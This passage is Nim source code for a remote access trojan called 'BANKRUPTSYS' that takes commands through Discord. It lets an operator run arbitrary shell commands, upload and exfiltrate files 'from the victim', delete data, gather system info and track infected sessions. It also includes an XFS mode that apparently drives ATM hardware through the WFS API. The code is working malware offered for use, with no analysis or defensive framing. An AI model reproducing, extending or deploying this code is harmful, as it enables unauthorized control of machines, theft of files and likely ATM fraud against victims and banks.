    let fut = spawn runBlockingCommand(cmd, pidHolder)

    var elapsed = 0
    let interval = 100

    while not isReady(fut) and elapsed < timeoutMs:
      await sleepAsync(interval)
      elapsed += interval

    if isReady(fut):
      return ^fut
    else:
      when defined(windows):
        discard execShellCmd("taskkill /PID " & $pidHolder[] & " /T /F")
      else:
        discard execShellCmd("kill -9 " & $pidHolder[])
      return "Command timed out and was terminated after " & $(timeoutMs div 1000) & " seconds."

  proc sendMessage(channelId: string, content: string): Future[Message] {.async.} =
    result = await discord.api.sendMessage(channelId, content)

  proc sendLongMessage(channelId: string, content: string): Future[void] {.async.} =
    const maxLen = 1980
    if content.len == 0:
      discard await discord.api.sendMessage(channelId, "```\n(Command executed with no output)\n```")
    
    var remaining = content
    while remaining.len > 0:
      let chunk = if remaining.len > maxLen: remaining[0 ..< maxLen] else: remaining
      discard await discord.api.sendMessage(channelId, "```\n" & chunk & "\n```")
      if remaining.len > maxLen:
        remaining = remaining[maxLen .. ^1]
      else:
        remaining = ""

  proc sendFile(channelId: string, filePath: string, fileName: string): Future[void] {.async.} =
    let fileContent = readFile(filePath)
    discard await discord.api.sendMessage(
        channelId,
        files = @[DiscordFile(name: fileName, body: fileContent)]
    )

  proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[string] {.async.} = 
    let cmd = rawCmd.strip()
    if cmd == "!help":
      return """Available Commands:
!help               - Shows this help message.
!ls or !dir         - List files in the current directory.
!cd <dir>           - Change directory.
!pwd                - Print the current working directory.
!upload             - Upload a file (attach it to the message).
!download <file>    - Download a file from the victim.
!mkdir <dir>        - Create a new directory.
!rm <file/dir>      - Remove a file or directory.
!sysinfo            - Get system information (OS, user, hostname).
!<command>          - Execute a shell command (e.g., !whoami).
!xfs <command>      - Execute an XFS command (e.g., !xfs scan, !xfs list).
"""

    let parts = cmd.split(' ', 1)
    let mainCmd = parts[0]
    if cmd == "!dir" or cmd == "!ls":
      when defined(windows):
        let (output, exitCode) = execCmdEx("cmd /c dir", options = {poUsePath}, workingDir = currentDir)
        if exitCode != 0:
          return "command failed with exit code " & $exitCode & ":\n" & output
        else:
          return output
      else:
        let (output, exitCode) = execCmdEx("ls", options = {poUsePath}, workingDir = currentDir)
        if exitCode != 0:
          return "command failed with exit code " & $exitCode & ":\n" & output
        else:
          return output

    elif mainCmd == "!pwd":
      return currentDir

    elif mainCmd == "!cd":
      let newDir = cmd[3..^1].strip()
      let targetDir = if os.isAbsolute(newDir): newDir else: os.joinPath(currentDir, newDir)
      if dirExists(targetDir):
        setCurrentDir(targetDir)
        currentDir = targetDir
        return "changed directory to " & currentDir
      else:
        return "directory not found: " & targetDir

    elif mainCmd == "!upload":
      if m.attachments.len == 0:
        return "no file attached. Please send a file with the !upload command."
      else:
        let attachment = m.attachments[0]
        let downloadUrl = attachment.url
        let fileName = attachment.filename
        try:
          let fileData = client.getContent(downloadUrl)
          let savePath = os.joinPath(currentDir, fileName)
          writeFile(savePath, fileData)
          return "downloaded file to " & savePath
        except CatchableError as e:
          return "failed to download file: " & e.msg

    elif mainCmd == "!download":
      let fileName = cmd[9..^1].strip()
      let filePath = joinPath(currentDir, fileName)
      if fileExists(filePath):
        await sendFile(m.channel_id, filePath, fileName)
        return "download successful"
      else:
        return "file not found: " & filePath

    elif mainCmd == "!mkdir":
      let dirName = cmd[6..^1].strip()
      let dirPath = joinPath(currentDir, dirName)
      try:
        createDir(dirPath)
        return "created directory: " & dirPath
      except CatchableError as e:
        return "failed to create directory: " & e.msg

    elif mainCmd == "!rm":
      let target = cmd[3..^1].strip()
      let path = joinPath(currentDir, target)
      if fileExists(path):
        try:
          removeFile(path)
          return "Deleted file: " & path
        except CatchableError as e:
          return e.msg
      elif dirExists(path):
        try:
          removeDir(path)
          return "deleted directory: " & path 
        except CatchableError as e:
          return e.msg
      else:
        return "no such file or directory: " & path

    elif mainCmd == "!xfs":
      if parts.len < 2 or parts[1].len == 0:
        return "XFS command is missing. Try `!xfs scan` or `!xfs list`."
      let xfsCommand = parts[1]      
      let (output, exitCode) = execCmdEx(xfsCliExecutable & " " & xfsCommand, options = {poUsePath, poStdErrToStdOut})
      return if output.len > 0: output else: "(XFS command produced no output)"

    else:
      try:
        var command = cmd[1..^1]
        when defined(macosx):
          return await runCommandWithTimeoutKill(command, 60000)
        elif defined(windows):
          command = "cmd /c " & command
          return await runCommandWithTimeoutKill(command, 60000)
        else:
          return "unsupported platform for direct command execution."
      except CatchableError as e:
        return "error running command: " & e.msg

  proc getHostname(): string =
    when defined(windows):
      let (output, exitCode) = execCmdEx("hostname")
      if exitCode == 0:
        return output.strip()
      else:
        return "unknown hostname"
    else:
      let (output, exitCode) = execCmdEx("hostname")
      if exitCode == 0:
        return output.strip()
      else:
        return "unknown hostname"

  proc generateSessionId(): string =
    randomize()
    return getHostname().replace(" ", "-").strip()

  proc onReady(s: dimscord.Shard, r: Ready) {.event(discord).} =
    let machineName = getEnv("MACHINE_NAME", generateSessionId())
    if machineName notin sessionRegistry:
      sessionRegistry.add(machineName)

    let startupMessage = "Bot is online.\n" & machineName & " is live!"
    
    let dm = await discord.api.createUserDm(creatorId)
    await sendLongMessage(dm.id, startupMessage)

  proc messageCreate(s: dimscord.Shard, m: Message) {.event(discord).} =
    var client = newHttpClient()
    let machineName = getEnv("MACHINE_NAME", generateSessionId())
    let content = m.content.strip()
    echo "Processing command: ", content

    if content == "!sessions":
      let sessionList = if sessionRegistry.len == 0: "No active sessions." else: sessionRegistry.join("\n")
      discard await sendMessage(m.channel_id, sessionList)
      return
    elif content == "!ping":
      let before = epochTime() * 1000
      let msg = await discord.api.sendMessage(m.channel_id, "ping?")
      let after = epochTime() * 1000
      discard await discord.api.editMessage(m.channel_id, msg.id, "pong! took " & $int(after - before) & "ms | " & $s.latency() & "ms.")
      return

    if content.startsWith("!") and not content.startsWith("!sessions") and not content.startsWith("!ping"):
      let parts = content.split(' ', 1)
      let firstWord = parts[0]
      let isTargeted = firstWord.len > 1 and firstWord.startsWith("!") and not firstWord.startsWith("!!")
      
      if isTargeted:
        let targetName = firstWord[1..^1]

        if targetName == machineName:
          var commandToRun = if parts.len > 1: parts[1].strip() else: ""
          if commandToRun.len > 0:
            if not commandToRun.startsWith("!"):
              commandToRun = "!" & commandToRun
            
            try:
              let output = await handleCommand(commandToRun, m, client)
              if output.len > 0:
                try:
                  await sendLongMessage(m.channel_id, output)
                except CatchableError as e:
                  echo "Failed to send command output: ", e.msg
            except CatchableError as e:
              echo "Error on ", machineName, ": ", e.msg
          else:
            try: discard await sendMessage(m.channel_id, machineName & " is here!")
            except: discard
      else:
        try:
          let output = await handleCommand(content, m, client)
          if output.len > 0:
            await sendLongMessage(m.channel_id, output)
        except CatchableError as e:
          echo "Error executing command: ", e.msg
          try: discard await sendMessage(m.channel_id, "Error on " & machineName & " executing '" & content & "': " & e.msg)
          except: discard
        except Exception as e:
          echo "An unexpected error occurred on ", machineName, ": ", e.msg

when isMainModule:
  when defined(xfs):
    init()
    var apiVer: WFSVERSION
    let stream = newFileStream(stdout)
    let hResult = pWFSStartUp(3, addr apiVer)
    if hResult != WFS_SUCCESS:
      check(hResult, stream)
      quit(1)
    
    loadState(stream)

    var cmdParts: seq[string]
    for i in 1..paramCount():
      cmdParts.add(paramStr(i))
    
    let cmd = cmdParts.join(" ")
    handle(cmd, stream)

    if cmd.startsWith("open") or cmd.startsWith("close"):
      saveState()

    discard pWFSCleanUp()

  else:
    echo "Starting BANKRUPTSYS..."
    while true:
      try:
        waitFor discord.startSession()
        break
      except CatchableError as e:
        echo "Discord connection error: ", e.msg
        echo "Attempting to reconnect in 30 seconds..."
        sleep(30000)